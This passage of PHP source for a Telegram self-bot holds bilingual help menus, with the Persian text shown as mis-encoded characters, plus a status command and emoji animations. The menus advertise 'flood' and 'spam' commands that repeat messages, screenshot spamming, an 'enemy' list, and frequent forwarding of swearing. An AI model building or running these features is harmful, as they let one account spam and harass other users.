๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป flood  [Text] [Number] ยซโข
โขยป Spam your sentence in a message ยซโข
โขยป Example ยซโข
flood 10 Hi
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป spam  [Text] [Number] ยซโข
โขยป Send a message to the desired number ยซโข
โขยป Example ยซโข
spam 10 Hi
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>for</code> ยซโข
โขยป Forward swearing frequently ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>spam ss</code> ยซโข
โขยป To spam a screenshot (Only Pv) ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
แดแดแดแดษดแด แด๊ฐ สแดแด ษชษด แด๊ฑแด : $mem_using แดส
แดษชษดษข สแดแดแดแดแด ๊ฑแดสแด แดส : $load[0]
",
                                'parse_mode' => 'Markdown']);
                        } else {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
๊ฑแดส๊ฐ สแดแด ๊ฑแดแดแดสแดสแด
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป flood  [ุชุนุฏุงุฏ] [ูุชู] ยซโข
โขยป ุงุณูพู ุฌููู ุชู ?ฺฉ ูพ?ุงู ยซโข
โขยป ูุซุงู ยซโข
flood 10 ุณูุงู
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป spam  [ุชุนุฏุงุฏ] [ูุชู] ยซโข
โขยป ุงุฑุณุงู ?ฺฉ ูพ?ุงู ุจ ุชุนุฏุงุฏ ุฏูุฎูุงู ยซโข
โขยป ูุซุงู ยซโข
spam 10 ุณูุงู
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>for</code> ยซโข
โขยป ููุฑูุงุฑุฏ ูุญุด ุจุตูุฑุช ูฺฉุฑุฑ ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>spam ss</code> ยซโข
โขยป ุจุฑุง? ุงุณูพู ฺฉุฑุฏู ุงุณฺฉุฑ?ู ฺฏุฑูุชู ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
แดแดแดแดษดแด แด๊ฐ สแดแด ษชษด แด๊ฑแด : $mem_using แดส
แดษชษดษข สแดแดแดแดแด ๊ฑแดสแด แดส : $load[0]
",
                                'parse_mode' => 'Markdown']);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(answerhelp)$/si", $text)) {
                        if (file_get_contents('language.txt') == 'en') {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
๊ฑแดส๊ฐ สแดแด แดษด๊ฑแดกแดสสแดสแด
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป /setanswer  Answer|Text  ยซโข
โขยป Set auto-reply to a word or sentence ยซโข
โขยป Example ยซโข
/setanswer PawnSelf|Hi 
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป /delanswer  [Text] ยซโข
โขยป Delete auto-reply ยซโข
โขยป Example ยซโข
/delanswer PawnSelf
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป /answerlist ยซโข
โขยป Get automatic answer list ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
แดแดแดแดษดแด แด๊ฐ สแดแด ษชษด แด๊ฑแด : $mem_using แดส
แดษชษดษข สแดแดแดแดแด ๊ฑแดสแด แดส : $load[0]
",
                                'parse_mode' => 'Markdown']);
                        } else {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
๊ฑแดส๊ฐ สแดแด แดษด๊ฑแดกแดสสแดสแด
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป /setanswer  ุฌูุงุจ|ูุชู  ยซโข
โขยป ุชูุธ?ู ุฌูุงุจ ุฎูุฏฺฉุงุฑ ุจุฑุง? ?ู ฺฉููู ?ุง ุฌููู ยซโข
โขยป ูุซุงู ยซโข
/setanswer PawnSelf|baleArbab 
โขยป ูุงุฑุณ?ู ู?ุชูู?ู ุจูู?ุณ?ู ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป /delanswer  [ูุชู] ยซโข
โขยป ุญุฐู ุฌูุงุจ ุฎูุฏฺฉุงุฑ ยซโข
โขยป ูุซุงู ยซโข
/delanswer PawnSelf
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป /answerlist ยซโข
โขยป ุฏุฑ?ุงูุช ู?ุณุช ุฌูุงุจ ุฎูุฏฺฉุงุฑ ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
แดแดแดแดษดแด แด๊ฐ สแดแด ษชษด แด๊ฑแด : $mem_using แดส
แดษชษดษข สแดแดแดแดแด ๊ฑแดสแด แดส : $load[0]
",
                                'parse_mode' => 'Markdown']);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(otherhelp)$/si", $text)) {
                        if (file_get_contents('language.txt') == 'en') {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
โโโโโโโโโโโโโโโโโโโโโ
|โฆ ๊ฑแดส๊ฐ สแดแด แดแดสแดสสแดสแด โฆ|
โโโโโโโโโโโโโโโโโโโโโ
โโขยป <code>/bot  on</code> Or <code>/bot off</code> ยซโข
โฃโขยป Turn the robot on and off ยซโข
โ
โฃโขยป <code>/restart</code> ยซโข
โชโขยป Restart the robot ยซโข
โ
โฃโขยป <code>bot</code> ยซโข
โชโขยป Notice that the robot is online ยซโข
โ
โฃโขยป <code>load</code> ยซโข
โชโขยป Get Ping Server ยซโข
โ
โฃโขยป <code>hash text</code> ยซโข
โชโขยป Hash the desired text ยซโข
โ
โฃโขยป <code>/proxy</code> ยซโข
โชโขยป Receive Telegram proxy!! ยซโข
โ
โฃโขยป <code>/ping site.com</code> ยซโข
โชโขยป Ping the desired site! ยซโข
โ
โฃโขยป <code>encode text</code> ยซโข
โชโขยป Encoding text (Base64 encryption) ยซโข
โ
โฃโขยป <code>decode text</code> ยซโข
โชโขยป Decoding text (Base64 encryption) ยซโข
โ
โฃโขยป <code>left</code> ยซโข
โชโขยป Left the group  ยซโข
โ
โฃโขยป <code>coder</code> ยซโข
โโขยป To see the bot maker ยซโข
เฟ โโโโโโโฅโโฅโโโโโโ เฟ
 |=   โโโโโโโโขโโ 12:10   =|
 |=   โใคโใค โโใค โทใคโป   =|
 เฟ โโโโโโโฅโโฅโโโโโโ เฟ
",
                                'parse_mode' => 'Markdown']);
                        } else {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
โโโโโโโโโโโโโโโโโโโโโ
|โฆ ๊ฑแดส๊ฐ สแดแด แดแดสแดสสแดสแด โฆ|
โโโโโโโโโโโโโโโโโโโโโ
โขยป <code>/bot  on</code> Or <code>/bot off</code> ยซโข
โขยป ุฑูุดู ?ุง ุฎุงููุด ฺฉุฑุฏู ุฑุจุงุช ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>/restart</code> ยซโข
โขยป ุฑ?ุณุชุงุฑุช ฺฉุฑุฏู ุฑุจุงุช ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>bot</code> ยซโข
โขยป ุจุงุฎุจุฑ ุดุฏู ุงุฒ ุขููุง?ู ุจูุฏู ุฑุจุงุช ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>load</code> ยซโข
โขยป ฺฏุฑูุชู ูพ?ูฺฏ ุณุฑูุฑ ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>hash text</code> ยซโข
โขยป ูุด ฺฉุฑุฏู ูุชู ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>/proxy</code> ยซโข
โขยป ฺฏุฑูุชู ูพุฑูฺฉุณ? ุชูฺฏุฑุงู!! ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>/ping site.com</code> ยซโข
โขยป ฺฏุฑูุชู ูพ?ูฺฏ ุณุง?ุช ููุฑุฏูุธุฑ! ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>encode text</code> ยซโข
โขยป ุงูฺฉุฏ ฺฉุฑุฏู ูุชู (Base64 encryption) ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>decode text</code> ยซโข
โขยป ุฏ?ฺฉุฏ ฺฉุฑุฏู ูุชู (Base64 encryption) ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>left</code> ยซโข
โขยป ููุช ุฏุงุฏู ุงุฒ ฺฏุฑูู  ยซโข
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โขยป <code>coder</code> ยซโข
โขยป ุฏ?ุฏู ุณุงุฒูุฏู ุฑุจุงุช ยซโข
เฟ โโโโโโโฅโโฅโโโโโโ เฟ
 |=   โโโโโโโโขโโ 12:10   =|
 |=   โใคโใค โโใค โทใคโป   =|
 เฟ โโโโโโโฅโโฅโโโโโโ เฟ
",
                                'parse_mode' => 'Markdown']);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(enemyhelp)$/si", $text)) {
                        if (file_get_contents('language.txt') == 'en') {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
โโโโ ๊ฑแดส๊ฐ สแดแด แดษดแดแดสสแดสแด โโโโ
โ
โฃโฃ <code>/setenemy</code>  Number ID
โฃโฃ Adjust the enemy
โ
โฃโฃ <code>/delenemy</code> Number ID
โฃโฃ Remove user from enemy list
โ
โฃโฃ <code>reset enemylist</code>
โฃโฃ Clear the enemy list 
โ
โโโโโ ๏ธปโฆใโคโโผ  โข  โข  โข โโโโโโ
",
                                'parse_mode' => 'Markdown']);
                        } else {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
โโโโ ๊ฑแดส๊ฐ สแดแด แดษดแดแดสสแดสแด โโโโ
โ
 <code>/setenemy</code>  Number ID
 ุงูุฒูุฏู ฺฉุงุฑุจุฑ ุจู ู?ุณุช ุฏุดูู
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
 <code>/delenemy</code> Number ID
 ุญุฐู ฺฉุงุฑุจุฑ ุงุฒ ู?ุณุช ุฏุดูู
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
 <code>reset enemylist</code>
 ูพุงฺฉุณุงุฒ? ู?ุณุช ุฏุดูู 
โโโโโ ๏ธปโฆใโคโโผ  โข  โข  โข โโโโโโ
",
                                'parse_mode' => 'Markdown']);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(gphelp|ฺฏูพ ูููพ)$/si", $text)) {
                        if (file_get_contents('language.txt') == 'en') {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
โชโโโโโโโโโโโโโโโโโโโโซ 
โ******๊ฑแดส๊ฐ สแดแด ษขaแด สแดสแด******โ
โชโโโโโโโโโโโโโโโโโโโโซ 
โโขยป <code>ban replay</code> ยซโข
โ โขยป Ban User ยซโข
โ
โ โขยป <code>unban replay</code> ยซโข
โ โขยป UnBan User ยซโข
โ
โ โขยป <code>silent replay</code> ยซโข
โ โขยป Silent User ยซโข
โ
โ โขยป <code>unsilent replay</code> ยซโข
โ โขยป Unsilent User ยซโข
โ
โ โขยป <code>delall replay</code> ยซโข
โ โขยป Delete all user messages by replaying  ยซโข
โ
โ โขยป <code>tagall</code> ยซโข
โ โขยป Tag everyone in the group ยซโข
โ
โ โขยป <code>locklink on Or off</code> ยซโข
โ โขยป Turn on locklink mode ยซโข
โ
โ โขยป <code>lockgp on Or off</code> ยซโข
โ โขยป Turn off lockgp mode ยซโข
โ
โ โขยป <code>clean แด๊ฑษข</code> ยซโข
โ โขยป Clear messages! ยซโข
โโขยป Example : <code>clean 100</code> ยซโข
โชโโโโโโโโโโโโโโโโโโโโซ 
โจ สแดแด แด๊ฑแด : $mem_using แดส โจ
โจ แดษชษดษข สแดแดแดแดแด ๊ฑแดสแด แดส : $load[0] โจ
โชโโโโโโโโโโโโโโโโโโโโซ
-Note that you must have the desired permissions in the chat you use
",
                                'parse_mode' => 'Markdown']);
                        } else {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
โชโโโโโโโโโโโโโโโโโโโโซ 
โ******๊ฑแดส๊ฐ สแดแด ษขaแด สแดสแด******โ
โชโโโโโโโโโโโโโโโโโโโโซ 
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
 <code>ban replay</code> 
 ึ ุจู ฺฉุฑุฏู ุจุง ุฑ?ูพู? ฺฉุฑุฏู ุฑู? ฺฉุงุฑุจุฑ ึ
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
 <code>unban replay</code> 
 ึ ุญุฐู ุจู ุจุง ุฑ?ูพู? ฺฉุฑุฏู ุฑู? ฺฉุงุฑุจุฑ ึ
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
 <code>silent replay</code> 
ึ ุณฺฉูุช ฺฉุฑุฏู ุจุง ุฑ?ูพู? ฺฉุฑุฏู ุฑู? ฺฉุงุฑุจุฑ ึ
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
 <code>unsilent replay</code> 
ึ  ุญุฐู ุณฺฉูุช ฺฉุฑุฏู ุจุง ุฑ?ูพู? ฺฉุฑุฏู ุฑู? ฺฉุงุฑุจุฑ ึ
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
 <code>delall replay</code> 
ึ ุญุฐู ุชูุงู? ูพ?ุงู ูุง? ฺฉุงุฑุจุฑ ุจุง ุฑ?ูพู? ฺฉุฑุฏู ึ
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
 <code>tagall</code> 
 ึ ุชฺฏ ฺฉุฑุฏู ุชูุงู ุงูุฑุงุฏ ููุฌูุฏ ุฏุฑ ฺฏุฑูู ึ
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
 <code>locklink on Or off</code> 
 ึ ุฑูุดู ฺฉุฑุฏู ุญุงูุช ููู ู?ูฺฉ ึ
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
 <code>lockgp on Or off</code> 
ึ ุฑูุดู ฺฉุฑุฏู ุญุงูุช ููู ฺฏูพ ึ
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
 <code>clean แด๊ฑษข</code> 
ึ ูพุงฺฉุณุงุฒ? ูพ?ุงู ูุง! ึ
 Example : <code>แดสแดแดษด 100</code> 
โชโโโโโโโโโโโโโโโโโโโโซ 
โจ สแดแด แด๊ฑแด : $mem_using แดส โจ
โจ แดษชษดษข สแดแดแดแดแด ๊ฑแดสแด แดส : $load[0] โจ
โชโโโโโโโโโโโโโโโโโโโโซ
-ุชูุฌู ุฏุงุดุชู ุจุงุด?ุฏ ุดูุง ุฏุฑ ฺฏุฑูู ุจุง?ุฏ ูพุฑู?ุดู ููุฑุฏ ูุธุฑ ุฑุง ุฏุงุดุชู ุจุงุด?ุฏ
",
                                'parse_mode' => 'Markdown']);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(help|selfhelp|helpfa|ุฑุงูููุง)$/si", $text)) {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
+=====================+
|~๐ง๊ฑแดส๊ฐ สแดแด สแดสแด สษช๊ฑแด๐ง~|
+=====================+
โก | <code>timehelp</code> | โก
โจ | <code>actionshelp</code> | โจ
๐  | <code>otherhelp</code> | ๐ 
๐ฅ | <code>funhelp</code> | ๐ฅ
โญ | <code>funhelp2</code> | โญ
โ๏ธ | <code>texthelp</code> | โ๏ธ
๐ | <code>spamhelp</code> | ๐
๐ฑ | <code>answerhelp</code> | ๐ฑ
๐ | <code>enemyhelp</code> | ๐
๐ | <code>gphelp</code> | ๐
๐ฐ | <code>setlang fa Or en</code> | ๐ฐ
โ๏ธ | <code>Stats</code> | โ๏ธ
+====================+
|~ยปยปโYasinShadyโ๏ธยซยซ~|
|~ยปยปโ@Yasin_431โ๏ธยซยซ~|
+====================+
",
                            'parse_mode' => 'Markdown']);
                    }

                    if ($text == 'stats' or $text == 'ุขูุงุฑ' or $text == 'Stats' or $text == 'sTaTs') {
                        $res = ['bot' => 0, 'user' => 0, 'chat' => 0, 'channel' => 0, 'supergroup' => 0];
                        $g = json_encode($res);
                        $gf = json_decode($g);
                        $users = $gf->user;
                        $groups = $gf->chat;
                        $supergroups = $gf->supergroup;
                        $channels = $gf->channel;
                        $bots = $gf->bot;
                        $all = $users + $groups + $supergroups + $channels + $bots;
                        $mem = memory_get_usage();
                        $ver = phpversion();
                        $ver = phpversion();
                        $Timebio = file_get_contents("timebio.txt");
                        $Timename = file_get_contents("online.txt");
                        $Timepic = file_get_contents("timepic.txt");
                        $Bold = file_get_contents("bold.txt");
                        $italic = file_get_contents("italic.txt");
                        $Answeres = file_get_contents("markread.txt");
                        $Gameplay = file_get_contents("gameplay.txt");
                        $Markread = file_get_contents("markread.txt");
                        $Typinges = file_get_contents("typing.txt");
                        $partmode = file_get_contents("part.txt");
                        $codingmode = file_get_contents("coding.txt");
                        $strikethrough = file_get_contents("strikethrough.txt");
                        $undermode = file_get_contents("underline.txt");
                        $audioaction = file_get_contents("audioaction.txt");
                        $lockpv = file_get_contents("lockpv.txt");
                        $hashtagmode = file_get_contents("hashtag.txt");
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
Sแดแดแดแดs แดษชแดแดสษชแด : $Timebio 
Sแดแดแดแดs Tสแดษชษดษข : $Typinges
Sแดแดแดแดs แดษชแดแดแดษชแด : $Timepic
Sแดแดแดแดs สแดสแดแดแดxแด : $Bold
Sแดแดแดแดs แดษชแดแดษดแดแดแด : $Timename
Sแดแดแดแดs ษชแดแดสษชแด : $italic
Sแดแดแดแดs สแดแดแดแดแด  : $lockpv
Sแดแดแดแดs Aษดsแดกแดส : $Answeres
Sแดแดแดแดs ษขแดแดแดแดสแดส : $Gameplay
Sแดแดแดแดs แดแดสแดสแดแดแด : $Markread
Sแดแดแดแดs แดแดสแดแดแดแดแด : $partmode
Sแดแดแดแดs แดแดแดษชแดแดแดแดษชแดษด : $audioaction
Sแดแดแดแดs สแด๊ฑสแดแดษขแดแดแดแด : $hashtagmode
Sแดแดแดแดs แดษดแดแดสสษชษดแด : $undermode
Sแดแดแดแดs ๊ฑแดสษชแดแดแดสสแดแดษขส : $strikethrough
Sแดแดแดแดs แดแดแดษชษดษข : $codingmode
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
โฃ แดษชษดษข แดษดแด สแดแดแด ษขแดษชแดแด 

แดแดแดแดษดแด แด๊ฐ สแดแด ษชษด แด๊ฑแด : $mem_using แดส
แดษชษดษข สแดแดแดแดแด ๊ฑแดสแด แดส : $load[0]
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ", 'parse_mode' => 'MarkDown']);
                    }
                    if ($text == '/GhohNakhordokhtar' or $text == 'ฺฏูู ูุฎูุฑ ูพุณุฑ') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '๐ฉ________________๐ถโโ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฉ_______________๐ถโโ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฉ______________๐ถโโ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฉ_____________๐ถโโ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฉ๏ธ____________๐ถโโ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฉ___________๐ถโโ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฉ__________๐ถโโ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฉ_________๐ถโโ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฉ________๐ถโโ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฉ๏ธ_______๐ถโโ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฉ______๐ถโโ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฉ____๐ถโโ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฉ___๐ถโโ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฉ๏ธ__๐ถโโ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฉ_๐ถโโ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฉููุด ุฌุงู๐ฉ']);
                    }

                    if ($text == '/GhohNakhordokhtar' or $text == 'ฺฏูู ูุฎูุฑ ุฏุฎุชุฑ') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '๐ฉ________________๐ถโโ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฉ_______________๐ถโโ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฉ______________๐ถโโ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฉ_____________๐ถโโ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฉ๏ธ____________๐ถโโ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฉ___________๐ถโโ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฉ__________๐ถโโ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฉ_________๐ถโโ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฉ________๐ถโโ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฉ๏ธ_______๐ถโโ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฉ______๐ถโโ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฉ____๐ถโโ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฉ___๐ถโโ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฉ๏ธ__๐ถโโ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฉ_๐ถโโ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฉููุด ุฌุงู๐ฉ']);
                    }
                    if ($text == '/Ravani' or $text == 'ุฑูุงู?') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '๐ถ๐ฟโโ________________๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ถ๐ฟโโ_______________๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ถ๐ฟโโ______________๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ถ๐ฟโโ_____________๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ถ๐ฟโโ____________๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ถ๐ฟโโ___________๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ถ๐ฟโโ__________๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ถ๐ฟโโ_________๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ถ๐ฟโโ________๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ถ๐ฟโโ_______๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ถ๐ฟโโ______๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ถ๐ฟโโ____๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ถ๐ฟโโ___๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ถ๐ฟโโ__๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ถ๐ฟโโ_๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐จ']);
                    }
                    if ($text == 'ุชุงูฺฉ' or $text == 'tank') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => ".        (า`_ยด)
         <,๏ธปโฆฬตฬต โคโ า     ~  โข
โ?โโโโโโโ]โโโโโโโโโโโ โโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => ".        (า`_ยด)
         <,๏ธปโฆฬตฬต โคโ า     ~  โข
โ?โโโโโโโ]โโโโโโโโโโโ โโโ
โโโโโโโโโโโโโโโโโฆ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => ".        (า`_ยด)
         <,๏ธปโฆฬตฬต โคโ า     ~  โข
โ?โโโโโโโ]โโโโโโโโโโโ โโโ
โโโโโโโโโโโโโโโโโฆ
[โโโโโโโโโโโโโโโโโโโ]"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => ".        (า`_ยด)
         <,๏ธปโฆฬตฬต โคโ า     ~  โข
โ?โโโโโโโ]โโโโโโโโโโโ โโโ
โโโโโโโโโโโโโโโโโฆ
[โโโโโโโโโโโโโโโโโโโ]
โฅโโฒโโฒโโฒโโฒโโฒโโฒโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ุชุงูฺฉ ุฑู ุฏ?ุฏ?ุุ๐ค"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ุฏ?ฺฏู ูู?ุจ?ู?๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฅ๐ฅุจูู๐ฅ๐ฅ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => ".        (า`_ยด)
         <,๏ธปโฆฬตฬต โคโ า     ~  โข
โ?โโโโโโโ]โโโโโโโโโโโ โโโ
โโโโโโโโโโโโโโโโโฆ
[โโโโโโโโโโโโโโโโโโโ]
โฅโโฒโโฒโโฒโโฒโโฒโโฒโ"]);

                    }
                    if ($text == 'ุฏุง?ูุงุณูุฑ') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "โโโโโโโโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "โโโโโโโโโ
โโโโโโโโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "โโโโโโโโโ
โโโโโโโโโ
โโผโผโผโผโผ
โ 
โโฒโฒโฒโฒโฒ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "โโโโโโโโโ
โโโโโโโโโ
โโผโผโผโผโผ
โ 
โโฒโฒโฒโฒโฒ
โโโโโโโโโ
 โโ โโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "โโโโโโโโโ
โโโโโโโโโ
โโผโผโผโผโผ
โ  
โโฒโฒโฒโฒโฒ
